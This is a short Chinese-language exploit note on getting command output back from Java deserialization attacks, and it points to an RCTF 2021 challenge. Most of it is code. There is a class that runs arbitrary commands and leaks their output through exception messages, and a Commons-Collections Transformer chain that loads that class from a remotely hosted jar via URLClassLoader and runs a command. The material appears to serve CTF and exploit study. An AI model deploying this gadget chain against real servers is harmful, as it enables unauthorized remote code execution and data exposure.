# java回显

>一般web服务是想办法获得response对象，可以参考[2021RCTF ezshell](https://github.com/Firebasky/ctf-Challenge/tree/main/RCTF-2021-EZshell)


### 通过报错回显

```java
package exploit.firebasky;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class ErrorBaseExec
{
    public ErrorBaseExec(String cmd) throws Exception{
        do_exec(cmd);
    }

    public static byte[] readBytes(InputStream in)
            throws IOException
    {
        BufferedInputStream bufin = new BufferedInputStream(in);
        int buffSize = 1024;
        ByteArrayOutputStream out = new ByteArrayOutputStream(buffSize);
        byte[] temp = new byte[buffSize];
        int size = 0;
        while ((size = bufin.read(temp)) != -1) {
            out.write(temp, 0, size);
        }
        bufin.close();

        byte[] content = out.toByteArray();

        return content;
    }

    public static void do_exec(String cmd)
            throws Exception
    {
        Process p = Runtime.getRuntime().exec(cmd);
        byte[] stderr = readBytes(p.getErrorStream());
        byte[] stdout = readBytes(p.getInputStream());
        int exitValue = p.waitFor();
        if (exitValue == 0) {
            throw new Exception("-----------------\r\n" + new String(stdout) + "-----------------\r\n");
        }
        throw new Exception("-----------------\r\n" + new String(stderr) + "-----------------\r\n");
    }

    public static void main(String[] args)
            throws Exception
    {
        do_exec(args[0]);
    }
}
```
编译成jar之后可以封装到cc利用链组件中
```java
public static Transformer[] EchoCC() throws Exception  {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(URLClassLoader.class),
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{URL[].class}}),
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8099/ErrorBaseExec.jar")}}}),
            new InvokerTransformer("loadClass",
                new Class[]{String.class},
                new Object[]{"exploit.firebasky.ErrorBaseExec"}),
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{String.class}}),
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new String[]{"ipconfig"}})
        };
        return transformers;
    }
```

